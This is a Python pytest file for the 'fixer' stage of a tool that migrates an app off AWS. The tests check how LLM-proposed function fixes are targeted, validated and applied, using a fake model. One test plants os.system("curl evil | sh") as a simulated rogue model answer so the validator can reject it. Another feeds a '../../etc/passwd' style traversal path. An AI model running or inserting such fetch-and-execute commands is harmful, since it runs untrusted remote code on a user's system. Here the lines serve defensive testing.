"""Fixer (docs/15 §6.3) on a de-locked tests/data/mini_app with a fake LLM: no model, no Docker."""

from __future__ import annotations

import shutil
from pathlib import Path

import pytest
from test_delock import GET_ORDER, LIST_BY_CUSTOMER, MINI_APP, Run, make_run
from test_pipeline import llm, source, verification, world  # noqa: F401 - fixtures for the pipeline test

from boomerang import fixer, pipeline
from boomerang import llm as llm_mod
from boomerang.events import read_events
from boomerang.fsutil import hash_tree
from boomerang.models import FixResult, FunctionRewrite, RewriteRecord, TestFailure, TestReport

REAL_FIX = fixer.fix                     # test_pipeline's `world` replaces it with a fake

# get_order after the de-lock, broken on purpose: the Decimal → int conversion (`_clean`) is gone
BROKEN_GET_ORDER = GET_ORDER.replace("return _clean(item) if item else None", "return item")
FIXED = FixResult(root_cause_analysis="The adapter returns numbers as Decimal, like boto3; the migrated version "
                                      "dropped the _clean() conversion the original had, so total_cents is a "
                                      "Decimal. Restore it.", file="app/db.py", function="get_order",
                  new_source=GET_ORDER)


# ---------- a de-locked app with a broken get_order ----------

@pytest.fixture
def delocked(tmp_path: Path, fake_llm) -> Run:
    fake_llm.responses.update({
        "delock:app/db.py:get_order": FunctionRewrite(analysis="ConsistentRead dropped", new_source=GET_ORDER),
        "delock:app/db.py:list_orders_by_customer": FunctionRewrite(analysis="Key(...).eq",
                                                                     new_source=LIST_BY_CUSTOMER),
    })
    run = make_run(tmp_path)
    run.records = run.delock()                                       # type: ignore[attr-defined]
    shutil.copytree(MINI_APP, run.root / "original")                 # the untouched AWS app (rollback source)
    db = run.app / "app" / "db.py"
    text = db.read_bytes().decode("utf-8")
    assert GET_ORDER in text
    db.write_bytes(text.replace(GET_ORDER, BROKEN_GET_ORDER).encode("utf-8"))
    fake_llm.calls.clear()
    return run


def line_of(run: Run, needle: str, rel: str = "app/db.py") -> int:
    lines = run.text(rel).splitlines()
    return next(i for i, ln in enumerate(lines, 1) if needle in ln)


def pytest_tb(run: Run, *, absolute: bool = False, adapter: bool = False) -> str:
    """A pytest --tb=auto traceback: test frame (long), app frame (long, last or not), adapter frame."""
    app = f"{run.app}\\app\\db.py" if absolute else "app/db.py"
    line = line_of(run, "return item")
    tb = (f"    def test_order_round_trip():\n>       assert db.get_order(oid)['total_cents'] == 1200\n\n"
          f"tests/test_mini.py:14: \n_ _ _ _ _ _ _ _\n\norder_id = '0b5c2c8e-8f7e-4b1e-9d55-3f5a1d1e2b7c'\n\n"
          f"    def get_order(order_id):\n>       return item\n\n{app}:{line}: ")
    if adapter:
        return tb + ("in get_order\nsovereign_sdk/kv.py:88: in get_item\n    raise UnsupportedFeature(x)\n"
                     "E   sovereign_sdk.kv.UnsupportedFeature: ConsistentRead\n\nsovereign_sdk/kv.py:88: "
                     "UnsupportedFeature")
    return tb + "TypeError\nE   TypeError: Object of type Decimal is not JSON serializable"


def report_with(*failures: TestFailure, attempt: int = 1) -> TestReport:
    return TestReport(attempt=attempt, platform="leaseweb", passed=7 - len(failures), failed=len(failures), errors=0,
                      total=7, duration_s=2.0, failures=list(failures))


def failure(tb: str, test: str = "tests/test_mini.py::test_order_round_trip",
            message: str = "TypeError: Object of type Decimal is not JSON serializable") -> TestFailure:
    return TestFailure(test=test, message=message, traceback=tb)


def run_fix(run: Run, report: TestReport, attempt: int = 1, rewrites: list[RewriteRecord] | None = None,
            ) -> list[RewriteRecord]:
    rewrites = run.records if rewrites is None else rewrites  # type: ignore[attr-defined]
    return fixer.fix(run.app, run.root / "original", run.pam, report, attempt, rewrites, run.diffs, run.emitter)


def events(run: Run, level: str | None = None) -> list[str]:
    return [e.message for e in run.events if e.stage == "fix" and level in (None, e.level)]


# ---------- frames ----------

def test_frames_pytest_short_and_long_formats():
    tb = ("tests/test_x.py:12: in test_get\n    db.get_order('1')\n"
          "app/db.py:27: in get_order\n    resp = orders.get_item(Key=k)\n"
          "E   TypeError: boom\n"
          ">       assert x.py:3: is not a frame\n"
          "sovereign_sdk/kv.py:88: \n"
          "app/db.py:30: KeyError")
    assert fixer.frames(tb) == [("tests/test_x.py", 12, "test_get"), ("app/db.py", 27, "get_order"),
                                ("sovereign_sdk/kv.py", 88, ""), ("app/db.py", 30, "")]


def test_frames_classic_format_with_windows_paths_and_crlf():
    tb = ('Traceback (most recent call last):\r\n'
          '  File "C:\\Users\\Jo Do\\runs\\r1\\leaseweb\\app\\app\\db.py", line 27, in get_order\r\n'
          '    resp = orders.get_item(Key=k)\r\n'
          '  File "<frozen importlib._bootstrap>", line 1, in _find_and_load\r\n'
          '  File "/usr/lib/python3.12/site-packages/botocore/client.py", line 553, in _api_call\r\n'
          "KeyError: 'Item'\r\n")
    assert fixer.frames(tb) == [("C:\\Users\\Jo Do\\runs\\r1\\leaseweb\\app\\app\\db.py", 27, "get_order"),
                                ("/usr/lib/python3.12/site-packages/botocore/client.py", 553, "_api_call")]


def test_frames_on_text_without_frames():
    assert fixer.frames("") == []
    assert fixer.frames("FAILED tests/test_x.py::test_a - AssertionError: assert 6 == 7") == []


# ---------- target selection ----------

def test_app_frame_is_the_target_and_the_fix_lands(delocked, fake_llm):
    fake_llm.responses["fix:1:app/db.py:get_order"] = FIXED
    tests_before = hash_tree(delocked.app / "tests")
    records = run_fix(delocked, report_with(failure(pytest_tb(delocked))))

    assert [c["label"] for c in fake_llm.calls] == ["fix:1:app/db.py:get_order"]
    assert len(records) == 1
    r = records[0]
    assert (r.kind, r.attempt, r.accepted, r.file, r.function) == ("fix", 1, True, "app/db.py", "get_order")
    assert r.analysis.startswith("The adapter returns numbers as Decimal")
    assert r.changed_lines == 1
    assert r.diff_path == "diffs/app_db.py__get_order.fix1.diff"
    diff = (delocked.root / r.diff_path).read_text(encoding="utf-8")
    assert "-    return item" in diff and "+    return _clean(item) if item else None" in diff
    assert GET_ORDER in delocked.text("app/db.py")
    assert hash_tree(delocked.app / "tests") == tests_before                  # never touches tests/
    assert any("fixed by AI" in m for m in events(delocked, "success"))


def test_the_prompt_compares_original_and_migrated_and_is_run_independent(delocked, fake_llm):
    fake_llm.responses["fix:1:app/db.py:get_order"] = FIXED
    run_fix(delocked, report_with(failure(pytest_tb(delocked, absolute=True))))
    call = fake_llm.calls[0]
    user, system = call["user"], call["system"]
    assert call["schema"] is FixResult and call["stage"] == "fix"
    assert "The tests are correct and cannot change" in system and "root_cause_analysis" in system
    assert "def get_item(self, Key: dict)" in system                         # the adapter interface
    original = user.split("<<<ORIGINAL_FUNCTION")[1].split("ORIGINAL_FUNCTION>>>")[0]
    migrated = user.split("<<<MIGRATED_FUNCTION")[1].split("MIGRATED_FUNCTION>>>")[0]
    assert "ConsistentRead=True" in original and "_clean(item)" in original   # the AWS version, from original/
    assert "return item" in migrated and "ConsistentRead" not in migrated
    assert "orders = dynamodb.Table(" in user and "kv.resource()" in user     # context after the swap
    assert str(delocked.root) not in user and str(delocked.app) not in user   # no absolute paths
    assert "app/db.py:" in user and "<uuid>" in user                          # stable_text applied
    assert 'Answer with `file` = "app/db.py" and `function` = "get_order"' in user
    assert "previous fix" not in user


def test_failure_inside_the_adapter_targets_the_app_caller_with_a_warning(delocked, fake_llm):
    fake_llm.responses["fix:1:app/db.py:get_order"] = FIXED
    records = run_fix(delocked, report_with(failure(pytest_tb(delocked, adapter=True))))
    assert [(r.function, r.accepted) for r in records] == [("get_order", True)]
    assert any("inside the adapter" in m and "owners B/A" in m for m in events(delocked, "warning"))


def test_failure_only_inside_the_adapter_is_skipped_with_an_error(delocked, fake_llm):
    tb = "sovereign_sdk/queue.py:40: in client\n    pika.BlockingConnection()\nsovereign_sdk/queue.py:41: AMQPError"
    assert run_fix(delocked, report_with(failure(tb))) == []
    assert fake_llm.calls == []
    assert any("inside sovereign_sdk/" in m for m in events(delocked, "error"))


def test_no_app_frame_uses_the_test_name_heuristic(delocked, fake_llm):
    fake_llm.responses["fix:1:app/db.py:list_orders_by_customer"] = FixResult(
        root_cause_analysis="r", file="app/db.py", function="list_orders_by_customer",
        new_source=LIST_BY_CUSTOMER.replace("[_clean(i) for i in", "[_clean(dict(i)) for i in"))
    tb = "    def test_list_by_customer():\n>       assert len(rows) == 1\nE   assert 0 == 1\n\ntests/test_mini.py:20: AssertionError"
    records = run_fix(delocked, report_with(failure(tb, test="tests/test_mini.py::test_list_by_customer",
                                                    message="assert 0 == 1")))
    assert [c["label"] for c in fake_llm.calls] == ["fix:1:app/db.py:list_orders_by_customer"]
    assert [(r.function, r.accepted) for r in records] == [("list_orders_by_customer", True)]
    assert any("heuristic target app/db.py:list_orders_by_customer" in m for m in events(delocked))


def test_heuristic_prefers_ai_rewritten_functions_and_takes_at_most_two(delocked, fake_llm):
    picks = fixer._heuristic(delocked.app, "tests/test_mini.py::test_order_flow[case-1]",
                             delocked.records)  # type: ignore[attr-defined]
    names = [p.qualname for p in picks]
    assert len(names) == 2
    assert names[0] == "get_order"                       # rewritten by AI ranks before the 1:1 put_order etc.
    assert fixer._heuristic(delocked.app, "tests/test_mini.py::test_health", delocked.records) == []  # type: ignore[attr-defined]


def test_no_target_at_all_returns_nothing(delocked, fake_llm):
    tb = "tests/test_mini.py:5: in test_health\nE   assert 500 == 200"
    assert run_fix(delocked, report_with(failure(tb, test="tests/test_mini.py::test_health"))) == []
    assert fake_llm.calls == []
    assert run_fix(delocked, report_with()) == []


def test_module_level_failure_is_not_rewritten(delocked, fake_llm):
    line = line_of(delocked, "orders = dynamodb.Table(")
    tb = f"tests/test_mini.py:3: in <module>\n    from app import db\napp/db.py:{line}: KeyError"
    assert run_fix(delocked, report_with(failure(tb))) == []
    assert any("module-level code" in m for m in events(delocked, "error"))


def test_container_and_foreign_absolute_paths_map_into_the_app(delocked):
    for path in ("/app/app/db.py", "C:\\other\\checkout\\leaseweb\\app\\app\\db.py", "app\\db.py",
                 str(delocked.app / "app" / "db.py")):
        assert fixer._app_relative(path, delocked.app.resolve()) == "app/db.py", path
    for path in ("/usr/lib/python3.12/site-packages/app/db.py", "../../etc/passwd.py", "nowhere/x.py"):
        assert fixer._app_relative(path, delocked.app.resolve()) is None, path


def test_one_call_per_function_with_the_failures_merged(delocked, fake_llm):
    fake_llm.responses["fix:1:app/db.py:get_order"] = FIXED
    tb = pytest_tb(delocked)
    run_fix(delocked, report_with(failure(tb, test="tests/test_mini.py::test_b", message="second"),
                                  failure(tb, test="tests/test_mini.py::test_a", message="first")))
    assert len(fake_llm.calls) == 1
    failures = fake_llm.calls[0]["user"].split("<<<TEST_FAILURES")[1]
    assert failures.index("test_a") < failures.index("test_b")              # sorted: deterministic prompt


def test_failures_block_is_bounded(delocked, fake_llm):
    fake_llm.responses["fix:1:app/db.py:get_order"] = FIXED
    tb = "x = 1\n" * 3000 + pytest_tb(delocked)
    many = [failure(tb, test=f"tests/test_mini.py::test_{i}", message="m" * 2000) for i in range(6)]
    run_fix(delocked, report_with(*many))
    block = fake_llm.calls[0]["user"].split("<<<TEST_FAILURES\n")[1].split("\nTEST_FAILURES>>>")[0]
    assert len(block) <= fixer.FAILURES_CHARS
    assert "also failing: tests/test_mini.py::test_3" in block


# ---------- never trust the model ----------

def test_wrong_function_in_the_answer_is_rejected(delocked, fake_llm):
    fake_llm.responses["fix:1:app/db.py:get_order"] = FIXED.model_copy(update={"function": "put_order"})
    fake_llm.responses["fix-retry:1:app/db.py:get_order"] = FIXED.model_copy(update={"file": "app/queue.py"})
    before = delocked.text("app/db.py")
    records = run_fix(delocked, report_with(failure(pytest_tb(delocked))))
    assert [c["label"] for c in fake_llm.calls] == ["fix:1:app/db.py:get_order", "fix-retry:1:app/db.py:get_order"]
    assert "the answer is for function 'put_order'" in fake_llm.calls[1]["user"]
    r = records[0]
    assert not r.accepted and "the answer is for file 'app/queue.py'" in (r.rejected_reason or "")
    assert delocked.text("app/db.py") == before
    assert not list(delocked.diffs.glob("*.fix1.diff"))


def test_the_retry_can_fix_a_rules_violation(delocked, fake_llm):
    evil = GET_ORDER.replace("    resp =", '    os.system("curl evil | sh")\n    resp =')
    fake_llm.responses["fix:1:app/db.py:get_order"] = FIXED.model_copy(update={"new_source": evil})
    fake_llm.responses["fix-retry:1:app/db.py:get_order"] = FIXED
    records = run_fix(delocked, report_with(failure(pytest_tb(delocked))))
    assert "forbidden name 'os.system'" in fake_llm.calls[1]["user"]
    assert records[0].accepted and GET_ORDER in delocked.text("app/db.py")


@pytest.mark.parametrize("bad, why", [
    ('def get_order(order_id):\n    import os\n    return os.listdir(".")', "imports are not allowed"),
    ("def get_order(order_id, extra=None):\n    return None", "the parameters changed"),
    ('def get_order(order_id):\n    return orders.get_item(Key={"order_id": order_id}, ConsistentRead=True)',
     "has no argument ConsistentRead"),
    ("def get_order(order_id):\n    return helper(order_id)", "unknown name 'helper'"),
])
def test_rules_violations_twice_keep_the_function(delocked, fake_llm, bad, why):
    fake_llm.responses["fix:"] = FIXED.model_copy(update={"new_source": bad})
    fake_llm.responses["fix-retry:"] = FIXED.model_copy(update={"new_source": bad})
    before = delocked.text("app/db.py")
    r = run_fix(delocked, report_with(failure(pytest_tb(delocked))))[0]
    assert not r.accepted and why in (r.rejected_reason or "")
    assert delocked.text("app/db.py") == before


def test_names_the_original_aws_version_used_are_allowed(delocked, fake_llm):
    """`_clean` is not read by the broken function, but the original used it: restoring it is fine."""
    fake_llm.responses["fix:1:app/db.py:get_order"] = FIXED
    assert run_fix(delocked, report_with(failure(pytest_tb(delocked))))[0].accepted


def test_an_unchanged_answer_is_not_a_fix(delocked, fake_llm):
    fake_llm.responses["fix:1:app/db.py:get_order"] = FIXED.model_copy(update={"new_source": BROKEN_GET_ORDER})
    r = run_fix(delocked, report_with(failure(pytest_tb(delocked))))[0]
    assert not r.accepted and r.rejected_reason == "the model returned the function unchanged"


def test_a_new_key_import_is_added_when_the_fix_uses_it(delocked, fake_llm):
    db = delocked.app / "app" / "db.py"
    text = db.read_bytes().decode("utf-8").replace("from boto3.dynamodb.conditions import Key\n", "")
    text = text.replace(LIST_BY_CUSTOMER, LIST_BY_CUSTOMER.replace('Key("customer_id").eq(customer_id)', "None"))
    db.write_bytes(text.encode("utf-8"))
    fake_llm.responses["fix:1:app/db.py:list_orders_by_customer"] = FixResult(
        root_cause_analysis="r", file="app/db.py", function="list_orders_by_customer", new_source=LIST_BY_CUSTOMER)
    line = line_of(delocked, "KeyConditionExpression=None")
    r = run_fix(delocked, report_with(failure(f"app/db.py:{line}: in list_orders_by_customer\nE   TypeError")))[0]
    assert r.accepted
    assert delocked.text("app/db.py").count("from boto3.dynamodb.conditions import Key\n") == 1


def test_llm_errors(delocked, fake_llm):
    def boom(call):
        raise llm_mod.LLMError("validation failed twice")
    fake_llm.responses["fix:"] = boom
    r = run_fix(delocked, report_with(failure(pytest_tb(delocked))))[0]
    assert not r.accepted and "no usable answer" in (r.rejected_reason or "")


@pytest.mark.parametrize("error", [llm_mod.CacheMiss("fix:1:app/db.py:get_order"), llm_mod.LLMUnavailable("no ollama")])
def test_cache_miss_and_unavailable_stop_the_stage(delocked, fake_llm, error):
    def raise_it(call):
        raise error
    fake_llm.responses["fix:"] = raise_it
    with pytest.raises(type(error)):
        run_fix(delocked, report_with(failure(pytest_tb(delocked))))


def test_tests_and_the_adapter_are_never_written(delocked, fake_llm):
    for rel in ("tests/test_mini.py", "sovereign_sdk/kv.py"):
        target = fixer._Target(rel, "test_order_round_trip", "traceback")
        assert fixer._fix_one(delocked.app, delocked.root / "original", target, 1, [], delocked.diffs,
                              delocked.emitter) is None
    assert fake_llm.calls == []
    assert sum("never written by the AI" in m for m in events(delocked, "error")) == 2


# ---------- attempt 2 ----------

def test_attempt_2_tells_the_model_what_attempt_1_did(delocked, fake_llm):
    wrong = FIXED.model_copy(update={"function": "put_order", "root_cause_analysis": "It was the region."})
    fake_llm.responses["fix:1:"] = wrong
    fake_llm.responses["fix-retry:1:"] = wrong
    tb = pytest_tb(delocked)
    first = run_fix(delocked, report_with(failure(tb)))
    assert not first[0].accepted

    fake_llm.responses["fix:2:app/db.py:get_order"] = FIXED
    second = run_fix(delocked, report_with(failure(tb), attempt=2), attempt=2,
                     rewrites=[*delocked.records, *first])  # type: ignore[attr-defined]
    prompt_1, prompt_2 = fake_llm.calls[0]["user"], fake_llm.calls[-1]["user"]
    assert prompt_1 != prompt_2
    assert "A previous fix of this function (attempt 1) was rejected" in prompt_2
    assert "It was the region." in prompt_2
    assert second[0].accepted and second[0].attempt == 2
    assert second[0].diff_path == "diffs/app_db.py__get_order.fix2.diff"


def test_previous_accepted_fix_is_reported_as_still_failing():
    rec = RewriteRecord(file="app/db.py", function="get_order", kind="fix", attempt=1, accepted=True,
                        analysis="Decimal")
    prev = fixer._previous([rec], "app/db.py", "get_order", 2)
    assert prev is not None and prev["outcome"] == "was applied, but the tests still fail"
    assert fixer._previous([rec], "app/db.py", "get_order", 1) is None       # only earlier attempts
    assert fixer._previous([rec], "app/db.py", "put_order", 2) is None


def test_more_failing_functions_than_the_cap_wait_for_the_next_round(delocked, fake_llm, monkeypatch):
    monkeypatch.setattr(fixer, "MAX_FUNCTIONS", 1)
    fake_llm.responses["fix:1:app/db.py:get_order"] = FIXED
    put = line_of(delocked, "orders.put_item(")
    records = run_fix(delocked, report_with(
        failure(pytest_tb(delocked), test="tests/test_mini.py::test_a"),
        failure(f"app/db.py:{put}: in put_order\nE   KeyError", test="tests/test_mini.py::test_b")))
    assert [r.function for r in records] == ["get_order"]
    assert any("the rest next round (app/db.py:put_order)" in m for m in events(delocked, "warning"))


def test_crlf_files_stay_crlf_after_a_fix(tmp_path, fake_llm):
    fake_llm.responses.update({
        "delock:app/db.py:get_order": FunctionRewrite(analysis="a", new_source=GET_ORDER),
        "delock:app/db.py:list_orders_by_customer": FunctionRewrite(analysis="b", new_source=LIST_BY_CUSTOMER),
        "fix:1:app/db.py:get_order": FIXED,
    })
    run = make_run(tmp_path, crlf=True)
    run.records = run.delock()                                       # type: ignore[attr-defined]
    shutil.copytree(MINI_APP, run.root / "original")
    db = run.app / "app" / "db.py"
    broken = db.read_bytes().replace(b"return _clean(item) if item else None", b"return item")
    db.write_bytes(broken)
    line = next(i for i, ln in enumerate(broken.decode().splitlines(), 1) if ln.strip() == "return item")
    assert run_fix(run, report_with(failure(f"app/db.py:{line}: in get_order\nE   TypeError")))[0].accepted
    data = db.read_bytes()
    assert b"return _clean(item) if item else None\r\n" in data and b"\n" not in data.replace(b"\r\n", b"")


# ---------- done when (docs/15 §6.3): through the real pipeline ----------

def test_pipeline_breaks_get_order_and_the_real_fixer_repairs_it(world, source, fake_llm, monkeypatch):
    """Verify 1 fails in get_order (Decimal → int lost) → the fixer repairs it → verify 2 is 7/7."""
    monkeypatch.setattr("boomerang.fixer.fix", REAL_FIX)
    fake_llm.responses["fix:1:app/db.py:get_order"] = FIXED

    def on_verify(leaseweb_dir: Path, attempt: int) -> None:
        db = leaseweb_dir / "app" / "app" / "db.py"
        text = db.read_bytes().decode("utf-8")
        if attempt == 1:
            db.write_bytes(text.replace(GET_ORDER, BROKEN_GET_ORDER).encode("utf-8"))
            line = next(i for i, ln in enumerate(db.read_text(encoding="utf-8").splitlines(), 1)
                        if ln.strip() == "return item")
            failing = verification(tests_ok=False)
            assert failing.tests is not None
            failing.tests.failures = [TestFailure(
                test="tests/test_mini.py::test_order_round_trip", message="TypeError: Decimal",
                traceback=f"tests/test_mini.py:14: \n\n{db}:{line}: TypeError\nE   TypeError: Decimal")]
            world.verifications = [failing, verification(attempt=2)]
        else:
            assert GET_ORDER in text                                   # the fix landed before verify 2

    world.on_verify = on_verify
    ctx = pipeline.plan(source, run_id="fixrun")
    pipeline.approve(ctx.run_id)
    summary = pipeline.execute(ctx.run_id)

    assert summary.status == "passed" and len(summary.verifications) == 2
    assert world.calls.count("verify:1") == 1 and world.calls.count("verify:2") == 1
    fixes = [r for r in summary.rewrites if r.kind == "fix"]
    assert [(f.function, f.attempt, f.accepted) for f in fixes] == [("get_order", 1, True)]
    assert summary.tests_unchanged is True
    assert (ctx.root / fixes[0].diff_path).is_file()                   # type: ignore[operator]
    assert '"kind": "fix"' in (ctx.root / "delock.json").read_text(encoding="utf-8")
    assert "🔧 fix (attempt 1)" in (ctx.root / "report.md").read_text(encoding="utf-8")
    stages = {e.stage for e in read_events(ctx.root / "events.jsonl")}
    assert "fix" in stages


# ---------- real model (C5 evidence; needs Ollama) ----------

@pytest.mark.llm
def test_real_model_repairs_the_broken_get_order(tmp_path):
    run = make_run(tmp_path)
    run.records = run.delock()                                       # type: ignore[attr-defined]
    shutil.copytree(MINI_APP, run.root / "original")
    db = run.app / "app" / "db.py"
    text = db.read_bytes().decode("utf-8")
    start = text.index("def get_order(")
    end = text.index("\n\n\n", start)
    body = text[start:end]
    broken = body.replace("_clean(item) if item else None", "item")
    assert broken != body, "the de-lock changed get_order's return line; update this test"
    db.write_bytes(text.replace(body, broken).encode("utf-8"))
    line = 1 + text[:start].count("\n") + broken.count("\n")
    tb = f"tests/test_mini.py:14: \n\napp/db.py:{line}: AssertionError\nE   assert Decimal('1200') is int"
    r = run_fix(run, report_with(failure(tb, message="AssertionError: total_cents is a Decimal")))[0]
    assert r.accepted, r.rejected_reason
    assert "_clean(" in run.text("app/db.py").split("def get_order(")[1].split("\ndef ")[0]
